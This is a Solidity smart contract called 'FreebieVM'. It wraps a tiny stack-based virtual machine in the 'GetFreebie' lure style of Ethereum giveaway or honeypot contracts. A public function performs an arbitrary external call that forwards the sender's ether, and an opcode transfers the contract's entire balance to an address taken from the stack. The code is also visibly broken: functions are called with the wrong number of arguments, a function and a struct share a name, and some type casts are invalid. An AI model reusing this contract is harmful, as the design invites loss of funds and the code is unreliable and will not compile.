pragma solidity ^0.4.19;

contract FreebieVM {
    address public Owner = msg.sender;
    uint256[] stack;
    uint256 pc;

    enum Instruction {
        PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, TRANSFER
    }

    struct Command {
        Instruction instr;
        uint256 operand;
    }

    Command[] program;

    function FreebieVM() public {
        program.push(Command(Instruction.LOAD, uint256(msg.sender)));
        program.push(Command(Instruction.STORE, 1));
    }

    function() public payable {}

    function GetFreebie() public payable {
        uint256 value = msg.value;
        execute(0, value);
    }

    function withdraw() public payable {
        execute(1, uint256(msg.sender));
    }

    function Command(address adr, bytes data) public payable {
        execute(2, uint256(adr), uint256(data));
    }

    function execute(uint256 entry, uint256 operand1, uint256 operand2) internal {
        pc = entry;
        stack.push(operand1);
        stack.push(operand2);
        
        while (pc < program.length) {
            Command memory cmd = program[pc];
            pc++;
            if (cmd.instr == Instruction.PUSH) {
                stack.push(cmd.operand);
            } else if (cmd.instr == Instruction.POP) {
                stack.length--;
            } else if (cmd.instr == Instruction.ADD) {
                uint256 b = stack[stack.length - 1];
                stack.length--;
                uint256 a = stack[stack.length - 1];
                stack[stack.length - 1] = a + b;
            } else if (cmd.instr == Instruction.SUB) {
                uint256 b = stack[stack.length - 1];
                stack.length--;
                uint256 a = stack[stack.length - 1];
                stack[stack.length - 1] = a - b;
            } else if (cmd.instr == Instruction.JMP) {
                pc = cmd.operand;
            } else if (cmd.instr == Instruction.JZ) {
                if (stack[stack.length - 1] == 0) {
                    pc = cmd.operand;
                }
                stack.length--;
            } else if (cmd.instr == Instruction.LOAD) {
                stack.push(cmd.operand);
            } else if (cmd.instr == Instruction.STORE) {
                uint256 index = cmd.operand;
                uint256 value = stack[stack.length - 1];
                stack.length--;
                stack[index] = value;
            } else if (cmd.instr == Instruction.CALL) {
                address adr = address(stack[stack.length - 2]);
                bytes memory data = bytes(stack[stack.length - 1]);
                adr.call.value(msg.value)(data);
                stack.length -= 2;
            } else if (cmd.instr == Instruction.TRANSFER) {
                address adr = address(stack[stack.length - 1]);
                uint256 bal = this.balance;
                adr.transfer(bal);
                stack.length--;
            }
        }
    }
}